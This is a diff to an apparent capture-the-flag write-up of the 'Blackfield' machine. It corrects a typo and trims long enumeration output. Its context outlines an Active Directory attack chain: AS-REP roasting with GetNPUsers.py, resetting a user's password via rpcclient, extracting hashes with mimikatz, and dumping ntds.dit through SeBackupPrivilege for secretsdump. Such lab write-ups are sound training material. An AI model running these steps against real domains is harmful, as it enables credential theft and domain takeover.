@@ -16,7 +16,7 @@ We pass the username list we get to Kerberos with help of <code class="language-
 Then we are able to login into rpcclient and change the password of another user, getting access to another smb share.
 The smb share contained a zip file which had a DMP file (a memory dump file).
 We use <code class="language-plaintext highlighter-rouge">mimikatz</code> on the DMP file and get the NTLM hash for a user on the box.
-After logging in with help of <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> we find that the user svc_backup has <code class="language-plaintext highlighter-rouge">SeBackupPrivelege</code> which means we can backup files.
+After logging in with help of <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> we find that the user svc_backup has <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> which means we can backup files.
 So backup the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file and the registry SYSTEM file, now we can use secretsdump.py to get the NTLM hash of the Administrator.
 Now we can use Evil-WinRM to login as Administrator.
  
@@ -142,31 +142,6 @@ smb: \> ls
   BNovrotsky                          D        0  Wed Jun  3 22:17:11 2020
   BRigiero                            D        0  Wed Jun  3 22:17:11 2020
   BSamkoses                           D        0  Wed Jun  3 22:17:11 2020
-  BZandonella                         D        0  Wed Jun  3 22:17:11 2020
-  CAcherman                           D        0  Wed Jun  3 22:17:12 2020
-  CAkbari                             D        0  Wed Jun  3 22:17:12 2020
-  CAldhowaihi                         D        0  Wed Jun  3 22:17:12 2020
-  CArgyropolous                       D        0  Wed Jun  3 22:17:12 2020
-  CDufrasne                           D        0  Wed Jun  3 22:17:12 2020
-  CGronk                              D        0  Wed Jun  3 22:17:11 2020
-  Chiucarello                         D        0  Wed Jun  3 22:17:11 2020
-  Chiuccariello                       D        0  Wed Jun  3 22:17:12 2020
-  CHoytal                             D        0  Wed Jun  3 22:17:12 2020
-  CKijauskas                          D        0  Wed Jun  3 22:17:12 2020
-  CKolbo                              D        0  Wed Jun  3 22:17:12 2020
-  CMakutenas                          D        0  Wed Jun  3 22:17:12 2020
-  CMorcillo                           D        0  Wed Jun  3 22:17:11 2020
-  CSchandall                          D        0  Wed Jun  3 22:17:12 2020
-  CSelters                            D        0  Wed Jun  3 22:17:12 2020
-  CTolmie                             D        0  Wed Jun  3 22:17:12 2020
-  DCecere                             D        0  Wed Jun  3 22:17:12 2020
-  DChintalapalli                      D        0  Wed Jun  3 22:17:12 2020
-  DCwilich                            D        0  Wed Jun  3 22:17:12 2020
-  DGarbatiuc                          D        0  Wed Jun  3 22:17:12 2020
-  DKemesies                           D        0  Wed Jun  3 22:17:12 2020
-  DMatuka                             D        0  Wed Jun  3 22:17:12 2020
-  DMedeme                             D        0  Wed Jun  3 22:17:12 2020
-  .....
   .....
   .....
   .....
@@ -186,7 +161,7 @@ sid@kali:~$ awk '{ print $1 }' usernames.txt > users.lst
 ```
 ### Generating TGT with help of GetNPUsers.py
 
-We can use GetNPUsers.py from the impacket tool which can check if there are any valid usernames and if they don't require Kerberos pre-authentication(PREAUTH) enabled.<br>
+We can use GetNPUsers.py from impacket which can check if there are any valid usernames and if they don't require Kerberos pre-authentication(PREAUTH) enabled.<br>
 From the nmap scan we know that the domain name is BLACKFIELD.local<br>
 
 ```shell
@@ -202,22 +177,7 @@ sid@kali:~$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-i
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
@@ -306,48 +266,8 @@ user:[BLACKFIELD764430] rid:[0x451]
 user:[BLACKFIELD538365] rid:[0x452]
 user:[BLACKFIELD189208] rid:[0x453]
 user:[BLACKFIELD404458] rid:[0x454]
-user:[BLACKFIELD706381] rid:[0x455]
-user:[BLACKFIELD937395] rid:[0x456]
-user:[BLACKFIELD553715] rid:[0x457]
-user:[BLACKFIELD840481] rid:[0x458]
-user:[BLACKFIELD622501] rid:[0x459]
-user:[BLACKFIELD787464] rid:[0x45a]
-user:[BLACKFIELD163183] rid:[0x45b]
-user:[BLACKFIELD869335] rid:[0x45c]
-user:[BLACKFIELD319016] rid:[0x45d]
-user:[BLACKFIELD253541] rid:[0x460]
-user:[BLACKFIELD175204] rid:[0x461]
-user:[BLACKFIELD727512] rid:[0x462]
-user:[BLACKFIELD227380] rid:[0x463]
-user:[BLACKFIELD251003] rid:[0x464]
-user:[BLACKFIELD129328] rid:[0x465]
-user:[BLACKFIELD616527] rid:[0x466]
-user:[BLACKFIELD533551] rid:[0x467]
-user:[BLACKFIELD883784] rid:[0x468]
-user:[BLACKFIELD908329] rid:[0x469]
-user:[BLACKFIELD609423] rid:[0x530]
-user:[BLACKFIELD395725] rid:[0x531]
-user:[BLACKFIELD438923] rid:[0x532]
-user:[BLACKFIELD691480] rid:[0x533]
-user:[BLACKFIELD236467] rid:[0x534]
-user:[BLACKFIELD895235] rid:[0x535]
-user:[BLACKFIELD651599] rid:[0x53a]
-user:[BLACKFIELD579344] rid:[0x53b]
-user:[BLACKFIELD859776] rid:[0x53c]
-user:[BLACKFIELD584113] rid:[0x570]
-user:[BLACKFIELD204805] rid:[0x571]
-user:[BLACKFIELD842593] rid:[0x572]
-user:[BLACKFIELD397679] rid:[0x573]
-user:[BLACKFIELD842438] rid:[0x574]
-user:[BLACKFIELD286615] rid:[0x575]
-user:[BLACKFIELD224839] rid:[0x576]
-user:[BLACKFIELD631599] rid:[0x577]
-user:[BLACKFIELD247450] rid:[0x578]
-user:[BLACKFIELD290582] rid:[0x579]
-user:[BLACKFIELD657263] rid:[0x57a]
-user:[BLACKFIELD314351] rid:[0x57b]
-user:[BLACKFIELD434395] rid:[0x57c]
-user:[BLACKFIELD410243] rid:[0x57d]
+...
+...
 user:[BLACKFIELD307633] rid:[0x57e]
 user:[BLACKFIELD758945] rid:[0x57f]
 user:[BLACKFIELD541148] rid:[0x580]
